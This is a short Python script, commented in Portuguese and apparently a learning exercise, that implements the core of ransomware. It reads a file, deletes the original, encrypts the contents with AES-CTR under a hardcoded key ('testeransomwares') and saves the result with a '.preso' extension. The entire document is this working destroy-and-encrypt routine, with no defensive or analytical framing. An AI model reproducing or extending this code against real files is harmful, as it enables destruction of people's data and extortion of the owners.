import os
import pyaes


# Abrindo o arquivo
file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# removendo o arquivo

os.remove(file_name)

# definindo chave de encriptação

key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

# cryptografar o arquivo

crypto_data = aes.encrypt(file_data)

# salvar o arquivo criptografado

new_file = file_name + '.preso'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
